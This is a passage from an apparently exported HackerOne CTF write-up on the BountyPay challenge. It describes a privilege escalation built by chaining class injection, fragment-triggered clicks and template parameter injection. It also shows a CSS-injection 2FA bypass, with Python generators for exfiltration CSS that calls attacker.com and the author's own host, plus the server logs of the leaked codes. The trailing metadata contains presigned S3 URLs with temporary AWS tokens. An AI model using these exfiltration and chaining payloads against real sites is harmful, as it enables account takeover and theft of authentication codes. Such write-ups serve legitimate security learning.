$('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}) \n```\n\n### 0x7.2 Click event triggering\n\nAnother piece of code in `website.js` allows attacker to generate `click` events which, if combined with two described earlier clickable class elements, can be used to execute Javascript without user interaction.\n\n```javascript\ndocument.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"),\n\"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"),\n\"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"),\n\"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n\nThis code triggers `click` events if specific fragment is attached to current URL. So by appending URL with `#tab2` fragment attacker can send `click` event to any element with `tab2` class assigned.\n\n### 0x7.3 Parameter injection\n\nhttps://staff.bountypay.h1ctf.com/?template parameter is vulnerable to parameter injection where attacker, by converting `template` parameter into array: `template[]` can pass multiple values to web server resulting in concatenation of multiple templates:\n\n`/?template[]=home\u0026template[]=login`\n{F862638}\n\n### 0x7.4 Chaining vulnerabilities\n\n`website.js` code contains AJAX call that, if run by privileged user, can upgrade specific user to admin role:\n\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}),\n```\n\nWith all presented vulnerabilities attacker can design an attack targeting this functionality:\n\n1. Attacker can Inject class names `tab` , `tab2` and `upgradeToAdmin` into profile avatar DIV to turn it into clickable element that after clicking will execute code for `upgradeToAdmin` class elemen\n2. Attacker can attach `#tab2` to [/?template=ticket\u0026ticket_id=3582](https://staff.bountypay.h1ctf.com/?template=ticket\u0026ticket_id=3582) URL to execute `click` event on profile avatar DIV element effectively creating URL that will trigger `upgradeToAdmin` code without user interaction\n3. As code in `upgradeToAdmin` require `INPUT` element with name set to `username`  attacker can use Parameter injection vulnerability to concatenate `ticket` and `login`templates\n4. `login` template contains required `INPUT` element and attacker can control it's value with parameter `username=` attached to URL.\n\nPutting points 2-4 together attacker can construct following URL:\n\n`/?template[]=login\u0026template[]=ticket\u0026ticket_id=3582\u0026username=sandra.allison#tab2`\n\nWhich, when visited by privileged user, will execute XHR call to `/admin/upgrade?username=sandra.allison` with his user credentials without interaction effectively resulting in privilege escalation.\n\n### 0x7.5 Proof of concept\n\nAttacker can use `/admin/report?url=` endpoint to send specially crafted URL to admin team. Admin team will visit specified URL and trigger attacker's payload.\n\n`url` parameter expects Base64 encoded URL value:\n\n```bash\n$ echo \"/?template[]=login\u0026template[]=ticket\u0026ticket_id=3582\u0026username=sandra.allison#tab2\" | base64\n\nLz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI=\n\n```\n\nAfter sending this to `/admin/report` endpoint:\n\n```plaintext\nhttps://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI%3d\n\n[\"Report received\"]\n```\n\nUser privileges were escalated to admin role:\n{F862637}\n\n# 0x8 Two factor authentication bypass via CSS Injection\n\nFunctionality for paying bounties at https://app.bountypay.h1ctf.com is protected by two factor authentication.\n\nIt is possible to bypass 2FA authentication by performing CSS injection attack on mobile phone application which generates 2FA codes.\n\n## Details\n\nWhen 2FA code functionality is executed following request is made to the server:\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 73\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\n\n`app_style` parameter holds URL for CSS style definition file that is rendered on mobile device.\n\nBy manipulating this parameter attacker can inject own CSS definitions hosted from server under his control. This effectively means attacker can ex-filtrate various HTML elements included in the HTML page styled with injected CSS.\n\nThe main use for exploiting a CSS injection is data ex-filtration from input elements. The general CSS injection data ex-filtration method is to use css like:\n\n```css\ninput[name=csrf][value^=a]{\n    background-image: url(https://attacker.com/exfil/a);\n}\ninput[name=csrf][value^=b]{\n    background-image: url(https://attacker.com/exfil/b);\n}\n/* ... */\ninput[name=csrf][value^=9]{\n    background-image: url(https://attacker.com/exfil/9);   \n}\n```\n\nIf the first letter of input value is 'c' above CSS will trigger page load on https://attacker.com/exfil/c (which can be observed in web server logs).\n\n## Proof of concept\n\nTo perform successful CSS injection to exfiltrate `INPUT` element we need to know element name. Usually this is known as page source is available. In this case injection is done into web page with unknown structure.\n\n### Step 1\n\nSo first step will be finding input element name by injecting following CSS:\n\n```css\ninput[name^=\"a\"] {\n background: url(https://www.jeti.pw/exfil/a);\n}\n\ninput[name^=\"b\"] {\n background: url(https://www.jeti.pw/exfil/b);\n}\n[...]\n```\n\nI've created helper python script to speed up the process of generating \n\n```python\nimport string\nimport sys\n\nurl = sys.argv[1]\nprefix = sys.argv[2]\n\nfor i in string.ascii_letters + string.digits + \"-_\":\n  print ('input[name^=\"{}{}\"] {{\\n background: url({}/{}{});\\n}}\\n'.format(prefix,i,url,prefix,i))\n```\n\nScript takes `url` and `prefix` parameters and generates CSS file to stdout.\n\n```bash\nbash$ python prepare_css.py https://www.jeti.pw/exfil \"\" \u003e /www/html/injection.css\n```\n\n### Step 2\n\nNow we need to inject generated CSS file:\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nContent-Length: 73\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.jeti.pw%2Finjection.css\n```\n\nInjected CSS will make request to https://www.jeti.pw/ server:\n\n```bash\n3.21.98.146 - - [10/Jun/2020:14:03:26 +0000] \"GET /exfil/c HTTP/1.1\"\n```\n\nSo we know that `INPUT` element name starts with `c` .\n\nBy repeating generation of CSS file and changing `prefix` parameter we can get whole `INPUT` parameter name:\n\n```bash\nbash$ python prepare_css.py https://www.jeti.pw/exfil \"c\" \u003e /www/html/injection.css\n```\n\nResponse in logs:\n\n```bash\n3.21.98.146 - - [10/Jun/2020:14:10:14 +0000] \"GET /exfil/co HTTP/1.1\"\n```\n\nAfter repeating this process few times we get prefix of `code_`. At that point we see in web server logs that in fact there are 7 separate fields: `code_1` to `code_7`\n\n```bash\n3.21.98.146 - - [10/Jun/2020:14:11:03 +0000] \"GET /exfil/code_1 HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:14:11:03 +0000] \"GET /exfil/code_7 HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:14:11:03 +0000] \"GET /exfil/code_2 HTTP/1.1\" \n3.21.98.146 - - [10/Jun/2020:14:11:03 +0000] \"GET /exfil/code_3 HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:14:11:03 +0000] \"GET /exfil/code_4 HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:14:11:03 +0000] \"GET /exfil/code_5 HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:14:11:03 +0000] \"GET /exfil/code_6 HTTP/1.1\"\n```\n\n### Step 3\n\nAs there are 7 different `INPUT` elements (where each probably holds one character from the token code) we need to use different helper python script:\n\n```python\nimport string\nimport sys\n\nurl = sys.argv[1]\n\nfor i in string.ascii_letters + string.digits + \"-_\":\n    for field in range(1,7):\n        print ('input[name^=\"code_{}\"][value^=\"{}\"] {{\\n background: url({}/code_{}/{});\\n}}\\n'.format(field,i,url,field,i))\n```\n\nThis will generate one file for ex-filtration of all 7 fields:\n\n```css\ninput[name^=\"code_1\"][value^=\"a\"] {\n background: url(https://www.jeti.pw/exfil/code_1/a);\n}\n\ninput[name^=\"code_2\"][value^=\"a\"] {\n background: url(https://www.jeti.pw/exfil/code_2/a);\n}\n\ninput[name^=\"code_3\"][value^=\"a\"] {\n background: url(https://www.jeti.pw/exfil/code_3/a);\n}\n\ninput[name^=\"code_4\"][value^=\"a\"] {\n background: url(https://www.jeti.pw/exfil/code_4/a);\n}\n\ninput[name^=\"code_5\"][value^=\"a\"] {\n background: url(https://www.jeti.pw/exfil/code_5/a);\n}\n\ninput[name^=\"code_6\"][value^=\"a\"] {\n background: url(https://www.jeti.pw/exfil/code_6/a);\n}\n\ninput[name^=\"code_7\"][value^=\"a\"] {\n background: url(https://www.jeti.pw/exfil/code_7/a);\n}\n\ninput[name^=\"code_1\"][value^=\"b\"] {\n background: url(https://www.jeti.pw/exfil/code_1/b);\n}\n\ninput[name^=\"code_2\"][value^=\"b\"] {\n background: url(https://www.jeti.pw/exfil/code_2/b);\n}\n\n[...]\n```\n\nInjecting this file will give us all values of `code_1` to `code_7` input elements:\n\n```bash\n3.21.98.146 - - [10/Jun/2020:15:04:03 +0000] \"GET /exfil/code_1/f HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:15:04:03 +0000] \"GET /exfil/code_2/G HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:15:04:03 +0000] \"GET /exfil/code_7/T HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:15:04:03 +0000] \"GET /exfil/code_3/W HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:15:04:03 +0000] \"GET /exfil/code_4/3 HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:15:04:03 +0000] \"GET /exfil/code_5/U HTTP/1.1\"\n3.21.98.146 - - [10/Jun/2020:15:04:03 +0000] \"GET /exfil/code_6/x HTTP/1.1\"\n```\n\nWe successfully retrieved token code that can be used to bypass 2FA authentication:\n\n{F862633}\n\nAfter bypassing 2FA authentication:\n{F850100}\n\n","automated_response":false,"created_at":"2020-06-10T16:30:39.911Z","updated_at":"2020-06-10T16:30:39.911Z","actor":{"username":"jeti","cleared":false,"url":"/jeti","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yx1viTW9oDGqB1gL1dz6GzEi/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":862639,"filename":"TwitterAccount.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ShVE1LvYF7oBZGKB5Df67eyz?response-content-disposition=attachment%3B%20filename%3D%22TwitterAccount.png%22%3B%20filename%2A%3DUTF-8%27%27TwitterAccount.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153818Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=bd0055b1e4038faa5327ebc79d644469eebbabf9192db55187ef5ed51e907a46"},{"id":862638,"filename":"TemplateConcatenated.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/U1DRSpG7pS98FERak6fJUqxo?response-content-disposition=attachment%3B%20filename%3D%22TemplateConcatenated.png%22%3B%20filename%2A%3DUTF-8%27%27TemplateConcatenated.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153818Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=8a4312e64b669e36e6b3ab569d45985d4c139b36faa6f2bf0acbbf9c5fff02cb"},{"id":862637,"filename":"PrivilegeEscalation.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/PpojbCoi6p8D3zTr5Fvw8es1?response-content-disposition=attachment%3B%20filename%3D%22PrivilegeEscalation.png%22%3B%20filename%2A%3DUTF-8%27%27PrivilegeEscalation.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153818Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5320291268efd5953328989d56b16e0c410273ab2b442973d4bf92b5b6044a96"},{"id":862636,"filename":"BountPayApp3.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Qm1cBketbw2vhFnrhBWh3pSK?response-content-disposition=attachment%3B%20filename%3D%22BountPayApp3.png%22%3B%20filename%2A%3DUTF-8%27%27BountPayApp3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153818Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4947a719dcebe7cf0660740c4e15eab35b8a06c7e50c281621722aad3ab9b768"},{"id":862635,"filename":"BountPayApp1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Gc5pYrNS24nwCu2f7vEDJ2JF?response-content-disposition=attachment%3B%20filename%3D%22BountPayApp1.png%22%3B%20filename%2A%3DUTF-8%27%27BountPayApp1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153818Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=cb4418610f2f7292ec1812182f928a1c30be6084d9ec1e4e12d256feada3ddbd"},{"id":862634,"filename":"BountPayApp2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vEWmSFVgo3dhoj6F5oArbpwJ?response-content-disposition=attachment%3B%20filename%3D%22BountPayApp2.png%22%3B%20filename%2A%3DUTF-8%27%27BountPayApp2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153818Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPzirXA4Q26F09GEsezqo%2FDgU%2BN1ov6Z0mJp8NxapcqVf3Oua4oSgb5aQpGLsAXhdiEaUoWsXCtHv4ujnK6mqk7E9O2WKXNjLPpfRYiEQ71CFLUQhpz1VlTUi8AaLKGm2tOz7W6Dg1b3xxjZfihfmfR6OPDce2Z600EmMbP%2BHpciOGhSEuGzpexDOGRgw4ix10R9155b0anW3PU4UD8Ge2PEqMj3%2FF8sUIZw7AbQUjqw1Ce9mhpbUZZfOQoy0pJ2t8c2T4BgwOhgN1b3fN5pnsElvfIuzUPOy6b490pAv%2BCqmrijPnhfxCFLh0JKO8JRVj8XuMyTl5hv6jZDQVsJsMAcXPrqar7TkmvMjkI%2BN4yDBkbH5NrA1VDNa0of9Y0Ob501UWmq3Ap93egI9bfOc0SJJuPizy58SnDrtHr6nSjyefAjpNL04P0FK2SzeJsSTTwhywI6YMiTBjKrFeC2gfVf8aFUGCIZ5qqWFJVDfVcx%2Fn8CXnNOSFJ4E0AOZCD2bzMOr0zl8cL%2FhRzxRrehVzw%2FTkoxOt0l7KmRzdTPKmnS8oozD2Cyle0v45%2B7sfTk9r6klH%2F2VLwfVaCQMt2wCz6DqzbD4MYWDvCaIbvvrbK5sZIedyaPkbcLAvRDDCjpGLBjqlAU9SRSSUKO2aO0kQO%2BnmnceQh7DtfcGkOUk0CXICIwNK0fD%2BqaMjTEwcyVBBW5oqUBOFZj7aKeXh%2FN47wB%2B%2BNyAlnunaZYfVUOsQGCMywCeVElq5cKhikJpo4VRBfaWxpOo%2Fjfp%2BVIoSdni5MQ6uLsqSIiA%2Fcm2GDHTprLxSZr5sstp5PxiiN53WteMJJW5bqZgjokn7B89wleOrzCJV84UVJ4OV7g%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=539bdbdb89f50a88a970a4d7b86230355be26a0f407dd1d2b64b2f377cf79bad"},{"id":862633,"filename":"2FABypass.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/S33umNEwBJSUj5xJewBp1MtJ?response-content-disposition=attachment%3B%20filename%3D%222FABypass.png%22%3B%20filename%2A%3DUTF-8%27%272FABypass.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZ6XJQAFX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153818Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICOXvTwruabcCgvIvFwMLdD63I7wJU77da1qgiZ0fcgxAiEA2iE07eZZp56fgfdC8AqwOSxwRZmRPTllfbb0Tbxm9MYqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDDj8b5u85%2FF%2BsdTPz